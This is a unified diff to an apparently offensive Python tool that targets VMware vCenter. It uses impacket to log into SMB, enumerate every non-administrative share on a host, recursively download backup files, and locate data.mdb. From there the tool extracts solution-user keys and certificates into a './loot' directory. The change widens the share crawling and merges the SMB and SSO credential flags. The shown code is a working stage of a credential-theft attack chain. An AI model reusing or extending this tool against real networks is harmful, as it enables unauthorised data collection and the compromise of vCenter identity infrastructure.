@@ -1211,40 +1211,58 @@ def discover_local(path: str) -> list:
     return hits
 
 
-def discover_smb(smb_url: str, user: str, password: str, domain: str) -> list:
+def discover_smb(t: str, user: str, password: str, domain: str) -> list:
     SMBConnection = _need('impacket.smbconnection', 'impacket.smbconnection', attr='SMBConnection')
-    m = re.match(r'//([^/]+)/([^/]+)', smb_url)
-    if not m:
-        sys.exit(f'[-] Invalid SMB URL (expected //HOST/SHARE): {smb_url}')
-    host, share = m.group(1), m.group(2)
 
-    print(f'[*] Connecting to SMB: \\\\{host}\\{share}')
+    # Parse target: \\host\share[\subpath], //host/share[/subpath], or bare host/IP
+    host = share = subpath = None
+    m = re.match(r'^[/\\]{2}([^/\\]+)[/\\]([^/\\]+)(?:[/\\](.*))?$', t.strip())
+    if m:
+        host    = m.group(1)
+        share   = m.group(2)
+        subpath = (m.group(3) or '').replace('/', '\\').rstrip('\\')
+    else:
+        host = t
+
     smb = SMBConnection(host, host, timeout=10)
     smb.login(user or '', password or '', domain or '')
-    print('[+] SMB authenticated')
+    print(f'[+] SMB authenticated to {host}')
 
     tmp   = Path(tempfile.mkdtemp(prefix='rav_smb_'))
     found = []
+    _SKIP = {'IPC$', 'ADMIN$', 'SYSVOL', 'NETLOGON', 'print$', 'PRINT$'}
 
-    def _walk(smb_path=''):
+    def _walk(sh, start=''):
         try:
-            for e in smb.listPath(share, (smb_path + '\\*') if smb_path else '\\*'):
+            pattern = f'{start}\\*' if start else '\\*'
+            for e in smb.listPath(sh, pattern):
                 name = e.get_longname()
-                if name in ('.', '..'):
-                    continue
-                full = f'{smb_path}\\{name}' if smb_path else name
+                if name in ('.', '..'): continue
+                full = f'{start}\\{name}' if start else name
                 if e.is_directory():
-                    _walk(full)
+                    _walk(sh, full)
                 elif _is_target(name):
-                    local = tmp / full.replace('\\', '_')
-                    print(f'[*] Downloading: {full}  ({e.get_filesize():,} B)')
+                    print(f'[*] \\\\{host}\\{sh}\\{full}  ({e.get_filesize():,} B)')
+                    local = tmp / f'{sh}_{full}'.replace('\\', '_')
                     with open(local, 'wb') as fh:
-                        smb.getFile(share, full, fh.write)
+                        smb.getFile(sh, full, fh.write)
                     found.append(local)
         except Exception:
             pass
 
-    _walk()
+    if share:
+        print(f'[*] Searching \\\\{host}\\{share}' + (f'\\{subpath}' if subpath else ''))
+        _walk(share, subpath)
+    else:
+        try:
+            shares = [s['shi1_netname'].rstrip('\x00') for s in smb.listShares()]
+        except Exception as e:
+            sys.exit(f'[-] Share enumeration failed on {host}: {e}')
+        for sh in shares:
+            if sh in _SKIP: continue
+            print(f'[*] Searching \\\\{host}\\{sh}')
+            _walk(sh)
+
     smb.logoff()
     return found
 
@@ -2010,17 +2028,14 @@ def parse_args():
     ap.add_argument('target', metavar='TARGET', help='vCenter IP or hostname')
     ap.add_argument('--local-path', metavar='PATH', dest='local_path',
                     help='data.mdb file, directory, or archive containing it')
-    ap.add_argument('--smb', metavar='//HOST/SHARE',
-                    help='SMB share to crawl for backup files')
-    ap.add_argument('--smb-user', metavar='USER', default='')
-    ap.add_argument('--smb-pass', metavar='PASS', default='')
-    ap.add_argument('--smb-domain', metavar='DOMAIN', default='WORKGROUP')
-    ap.add_argument('-u', metavar='USER', default='administrator',
-                    help='SSO username (default: administrator)')
+    ap.add_argument('-t', metavar='HOST|UNC',
+                    help='SMB target — bare host (enumerate all shares) or UNC path (\\\\host\\share[\\path])')
+    ap.add_argument('-u', metavar='USER', default='',
+                    help='Username (SMB auth / SSO fallback)')
     ap.add_argument('-p', metavar='PASS', default=None,
-                    help='vCenter admin password (optional fallback)')
+                    help='Password (SMB auth / vCenter SSO fallback)')
     ap.add_argument('-d', metavar='DOMAIN', default=None,
-                    help='SSO domain (default: extracted from data.mdb)')
+                    help='Domain (SMB auth / SSO domain override)')
     ap.add_argument('--out', metavar='DIR', default='./loot',
                     help='Output directory (default: ./loot)')
     ap.add_argument('--timeout', metavar='SECONDS', type=int, default=600,
@@ -2040,11 +2055,10 @@ def main():
     try:
         if args.local_path:
             paths = discover_local(args.local_path)
-        elif args.smb:
-            paths = discover_smb(args.smb, args.smb_user or '', args.smb_pass or '',
-                                 args.smb_domain or 'WORKGROUP')
+        elif args.t:
+            paths = discover_smb(args.t, args.u or '', args.p or '', args.d or '')
         else:
-            sys.exit('[-] Provide --local-path <path-to-data.mdb-or-dir> or --smb //host/share')
+            sys.exit('[-] Provide --local-path PATH or -t HOST')
 
         mdb_path = resolve_mdb(paths, work_dir)
         sol_key, sol_cert = resolve_solution_creds(paths, verbose=args.verbose)
